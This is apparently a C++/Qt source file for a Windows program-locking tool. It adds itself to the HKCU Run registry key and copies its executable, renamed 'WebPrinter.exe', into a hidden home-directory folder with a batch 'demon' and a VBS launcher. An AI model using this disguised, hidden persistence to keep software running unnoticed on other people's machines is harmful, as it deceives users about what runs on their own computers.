#include "Windows.h"
#include "winreg.h"
#include <stdio.h>
#include <tchar.h>
#include <QObject>
#include <QMessageBox>

#include "QDebug"
#include <QResource>
#include <QFile>
#include <QDir>
#include <QProcess>

#include "tchar2unicode.h"
#include "black.h"
#include "process.h"

#define REG_VALUE_NAME  "proglock"



void autostart()
{
    HKEY hKey;
    QString strRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

    if (RegOpenKeyExA(HKEY_CURRENT_USER, strRegPath.toStdString().c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
    {
        qDebug("open reg\n");
        TCHAR strDir[MAX_PATH] = {};
        DWORD nLength = MAX_PATH;
        long result = RegGetValue(hKey, nullptr, TEXT(REG_VALUE_NAME), RRF_RT_REG_SZ, nullptr, strDir, &nLength);

        TCHAR strExeFullDir[MAX_PATH];
        GetModuleFileName(nullptr, strExeFullDir, MAX_PATH);
        QString strExeFullDirString = QString::fromWCharArray(strExeFullDir);
        qDebug()<<strExeFullDirString;
        qDebug()<<QString((QChar*)strDir, wcslen(strDir));
        qDebug()<<QString((QChar*)strExeFullDir, wcslen(strExeFullDir)) << sizeof(TCHAR);

        QString RegPathString = QString((QChar*)strDir, wcslen(strDir));
        QString HideDirPath("\""+QDir::homePath()+"/.lockxxx/lockxxx.vbs\"");
        HideDirPath.replace("/","\\");

        //if (result != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0)
        if (result != ERROR_SUCCESS || RegPathString != HideDirPath)
        {
            RegSetValueEx(hKey, TEXT(REG_VALUE_NAME), 0, REG_SZ, (LPBYTE)QStringToTCHAR(HideDirPath), (wcslen(strExeFullDir)+1)*sizeof(TCHAR));
            CreateFiles(strExeFullDirString);
            qDebug("set reg\n");
        }
        RegCloseKey(hKey);
    }
    else
    {
        QMessageBox::warning(nullptr, QString::fromLocal8Bit("warn"), QString::fromLocal8Bit("\ncan't auto start\n"));
        qDebug("failed reg\n");
    }
}


void cmdProcess( QString cmdline )
{
//    STARTUPINFO si;
//    PROCESS_INFORMATION pi;

//    ZeroMemory( &si, sizeof(si) );
//    si.cb = sizeof(si);
//    si.dwFlags = STARTF_USESHOWWINDOW;
//    si.wShowWindow = SW_HIDE;
//    ZeroMemory( &pi, sizeof(pi) );

//    // Start the child process.
//    if( !CreateProcess( nullptr,   // No module name (use command line)
//        QStringToTCHAR(cmdline),   // Command line
//        nullptr,            // Process handle not inheritable
//        nullptr,            // Thread handle not inheritable
//        FALSE,              // Set handle inheritance to FALSE
//        0,                  // No creation flags
//        nullptr,            // Use parent's environment block
//        nullptr,            // Use parent's starting directory
//        &si,                // Pointer to STARTUPINFO structure
//        &pi )               // Pointer to PROCESS_INFORMATION structure
//    )
//    {
//        qDebug( "CreateProcess failed (%lu).\n", GetLastError() );
//        return;
//    }

//    // Wait until child process exits.
//    // WaitForSingleObject( pi.hProcess, INFINITE );

//    // Close process and thread handles.
//    CloseHandle( pi.hProcess );
//    CloseHandle( pi.hThread );

    QProcess::startDetached(cmdline);

    qDebug( "CreateProcess" );
}

void cancelAutoStart()
{
    HKEY hKey;
    QString strRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

    if (RegOpenKeyExA(HKEY_CURRENT_USER, strRegPath.toStdString().c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
    {
        RegDeleteValueA(hKey, REG_VALUE_NAME);

        RegCloseKey(hKey);
    }
}

bool CreateFiles(QString strExeFullPath)
{
    QString HideDirPath(QDir::homePath()+"/.lockxxx");
    QDir(HideDirPath).removeRecursively();
    QDir(HideDirPath).mkdir(HideDirPath);
    SetFileAttributes((LPCWSTR)HideDirPath.unicode(),FILE_ATTRIBUTE_HIDDEN);

    qDebug()<<"hide path"<<HideDirPath;
    QFile::copy(":/demon",HideDirPath + "/demon.bat");
    QFile::copy(":/vbs_file",HideDirPath + "/lockxxx.vbs");
    QFile::copy(strExeFullPath,HideDirPath + "/WebPrinter.exe");
//    cmdProcess("cmd /c \"" + HideDirPath + "/lockxxx.vbs\"");
    return true;
}
